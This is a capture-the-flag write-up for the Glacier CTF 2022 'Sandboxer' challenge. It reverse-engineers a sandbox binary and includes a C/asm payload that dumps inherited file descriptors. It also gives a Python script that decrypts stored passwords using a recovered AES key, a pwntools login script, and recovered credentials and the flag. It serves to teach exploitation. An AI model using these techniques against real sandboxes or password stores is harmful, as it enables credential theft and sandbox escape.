# 2022/11/25 Glacier CTF Rev/Pwn 496 Sandboxer Writeup

## Event Details

https://ctf.glacierctf.com/

https://ctftime.org/event/1803

### Team Played With

https://ctftime.org/team/208483

## Task Details

https://ctf.glacierctf.com/challenges#Sandboxer-77

### Task Description Provided By Organizers

> Steves company has a custom service that executes binaries in a sandbox. The admins changed his password though - can you still get in and leak theirs as revenge?

### Task Download

https://ctf.glacierctf.com/files/22744970423409ec69ce0f6010fe4377/sandbox?token=eyJ1c2VyX2lkIjoxOSwidGVhbV9pZCI6NiwiZmlsZV9pZCI6NDA1fQ.Y4Udxw.qqycaszPt5HF3lLutd_gMbFxGTU

sha256 `bb3bc4e20cc18e7546a8b2766fd68b293aca74d4065908599ab35819597fbea6`

```
$ file ./sandbox
./sandbox: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e3e355b9e0b653c49e591f8662608b802096c44e, for GNU/Linux 3.2.0, stripped
```

## Initial Impressions

Firstly notice that the task description gives some hints about how to sovle the task and what your overall goal is. The name "steve" is mentioned explicitly. You are informed that, in the past, Steve was able to log in but no longer can because his password has been changed. This suggests that "Steve" or "steve" is a valid username. The task also states that you must leak the admin's password. It is resonable to assume that this either is the flag itself or leads to it.

Secondly notice that when you input any password for a valid user such as steve that you are given back the password you entered plus a string that appears to be base64 and told that these are not equal. It seems that this is somehow related to the user's password and the most logical conclusion would be that this is a hash of some form.

Lastly notice that you are asked to supply a payload of up to 32kB and that it must be base64 encoded. This suggests that the task is split into two or more stages the first of which requires getting Steve's password and the second of which requires using the payload to access the admin's password.

## Binary Analysis

`FUN_00101ce8` / `main`
- Note that the payload is supplied to `main` via `argv` and is already base64 decoded
- Calls `FUN_00101ab6` to check if a valid username and password can be supplied
- `puts` the randomly created tmp directory assigned to this process and passed via argv
  - e.g `/tmp/tmp123kjsku9`
- Puts us in a chroot jail using `chroot( "/tmp/tmp123kjsku9" )` and `chdir( "/" )`
- Calls `setgid( 1042 )` and `setuid( 1042 )`
- Calls `FUN_00101c22` to constrain the process limits prior to `execv`ing the payload
- Calls `execv` supplying the payload

`FUN_00101ab6`
- Prompts for a username
  - Accepts any username with the exception of `"admin"` which is hardcoded to fail
- Calls `FUN_001019ea` to get the list of user:password entries
- Checks if the supplied user is present in the list of user:password entries
- Checks if the strlen of the encrypted and base64 encoded password, read from `userlist.txt` for the given user, is 44
  - This is because the maximum password plaintext length is 32 which produces 44 base64 characters
- Calls `FUN_00101952` to read the users password from stdin and check its validity

`FUN_001019ea`
- Opens a file `./userlist.txt`
  - We can assume that, in addition to steve's password that, the admin's password is in this file
- Reads the entire file into memory
- Doesn't close the open file descriptor
  - This potentially allows us to read the contents of this file from the child process by `lseek`ing to the start and reading it again

`FUN_00101952`
- Recieves the user's encrypted password base64 encoded as a parameter from `FUN_00101ab6`
- Allocates memory for a password of up to 32 bytes and reads this via `scanf`
- Calls `FUN_00101789` to compute the encrypted base64 representation of the password
- Compares the encrypted base64 representation of the password from `scanf` with the supplied password
  - If they do not match this function prints the plaintext password supplied via `scanf` and the encrypted base64 encoded password read from `userlist.txt`
    - Note that this allows us to see the encrypted and base64 encoded password for any user with the exception of the admin user

`FUN_00101789`
- Calls `FUN_00101387` to expand our secret, or short key, `0xcac70947580d12ecf428594f087de550` into 10 aes round keys
- Calls `FUN_0010150c`, two times sequentially on each 16 byte half of the plaintext, to xor and then aes ecb encrypt the password
- Calls `FUN_00101db4` to convert the encrypted password into base64

`FUN_00101387`
- Expands our provided short key `0xcac70947580d12ecf428594f087de550` using the aesni x86 instruction `aeskeygenassist` into 10 round keys
  - The round keys are stored at `DAT_00105110` through `DAT_00105190` ( each 16 bytes )
  - see https://en.wikipedia.org/wiki/AES_key_schedule for more details

`FUN_0010150c`
- Xors the 16 bytes of supplied plaintext with 16 bytes of the supplied xor key
  - Xoring the lower 16 bytes with `0xbb695bc2e3700a2ec92c0231bbca390c` during the first invocation of this function and the upper 16 bytes with `0xc157553f73a73501e19c9509f873aca9` during the second invocation
- Performs 10 rounds of aes ecb encryption using the aesni x86 instructions `aesenc` and `aesenclast` along with the round keys stored at `DAT_00105110` through `DAT_00105190` computed earlier by `FUN_00101387`
- Each invocation of this function produces 16 bytes of output which is combined to produce a 32 byte encrypted version of the password
- See https://en.wikipedia.org/wiki/AES_instruction_set for more details

`FUN_00101c22`
- Sets `RLIMIT_CORE` to 0
  - Limits the size of the core dump file that will be produced if it receives a "core dump" signal
- Sets `RLIMIT_CPU` to 5
  - This is a limit, in seconds, on the amount of CPU time that the process can consume
- Sets `RLIMIT_FSIZE` to 0x400
  - This is the maximum size in bytes of files that the process may create
- Sets `RLIMIT_NOFILE` to 32 and then again to 16
  - This specifies a value one greater than the maximum file descriptor number that can be opened by this process
  - This could also be a hint to consider the open file descriptors
- See https://man7.org/linux/man-pages/man2/getrlimit.2.html for more details

## Creating The Payload

```
extern int syscall3(int syscall_number, int arg1, int arg2, int arg3);
asm(
".globl    syscall3\n"
".type    syscall3, @function\n"
"syscall3:\n"
"  push ebx\n"
"  mov eax, dword ptr 16[esp]\n"
"  mov ebx, dword ptr 20[esp]\n"
"  mov ecx, dword ptr 24[esp]\n"
"  mov edx, dword ptr 28[esp]\n"
"  int 0x80\n"
"  pop ebx\n"
"  ret\n"
""
);

int lseek(int fd, int offset, int whence) {
    return syscall3(19, fd, offset, whence);
}

int read(int fd, void* buf, unsigned int size) {
    return syscall3(3, fd, (int)buf, size);
}

int write(int fd, void* buf, unsigned int size) {
    return syscall3(4, fd, (int)buf, size);
}

int exit(int ret) {
    return syscall3(1, ret, 0, 0);
}

int _start() {
    unsigned char buffer[4096];
    for (int i = 3; i < 32; ++i) {
        int res = lseek(i, 0, 0);
        if (res < 0)
            continue;
        int bytes_read = read(i, buffer, 4096);
        write(1, buffer, bytes_read);
    }
    exit(0);
}
```

To build the payload:

```
$ gcc -masm=intel -nostdlib -static -m32 -fno-builtin -fomit-frame-pointer shellcode.c -o shellcode
$ strip --strip-all shellcode
$ base64 -w 0 shellcode > payload
```

## Solution Details

1) Supply username "steve" along with any password
2) Recover the encrypted base64 encoded password for steve e.g `123456 != bf1mNC/KawRK6/cHRtX2JtAr8MNIYLvo6CGabdc6oyg=`
3) Base64 decode and decrypt using aes ecb with the key `0xcac70947580d12ecf428594f087de550`
4) Xor with `0xc157553f73a73501e19c9509f873aca9bb695bc2e3700a2ec92c0231bbca390c`
5) Recover user steve's plaintext password `H$g7FAKVR8f3&k!@wmMd6Vdk3rHSUrwg`
6) Use `steve:H$g7FAKVR8f3&k!@wmMd6Vdk3rHSUrwg` to upload an elf which seeks to the start of any open file descriptor, other than stdin/stdout/stderr, and dumps the contents
7) Recover the encrypted base64 encoded password for admin `3cW6609oe6bhKvnI1tPrGD77pivtx3So4uAgahNEKeQ=`
8) Recover admin's plaintext password as above `glacierctf{Ju57_P0s1X_th1ng5}` which is the flag

```
from Crypto.Cipher import AES
import struct
import base64

def crack(password):
    key = struct.pack("<QQ", 0xcac70947580d12ec, 0xf428594f087de550)
    aes = AES.new(key, AES.MODE_ECB)
    m = aes.decrypt(base64.b64decode(password))
    n = struct.pack("<QQQQ", 0xc157553f73a73501, 0xe19c9509f873aca9, 0xbb695bc2e3700a2e, 0xc92c0231bbca390c)
    print(bytes([i^j for i,j in zip(m,n)]))

crack('bf1mNC/KawRK6/cHRtX2JtAr8MNIYLvo6CGabdc6oyg=') # steve:H$g7FAKVR8f3&k!@wmMd6Vdk3rHSUrwg
crack('3cW6609oe6bhKvnI1tPrGD77pivtx3So4uAgahNEKeQ=') # admin:glacierctf{Ju57_P0s1X_th1ng5}
```

```
from pwn import *

io = remote('pwn.glacierctf.com', port=13374)

with open('./payload', 'r') as f:
  payload = f.read()

io.sendline(payload.encode())

io.recvregex('Username:'.encode())
io.sendline('steve'.encode())
io.recvregex('Password:'.encode())
io.sendline('H$g7FAKVR8f3&k!@wmMd6Vdk3rHSUrwg'.encode())

io.interactive()
```
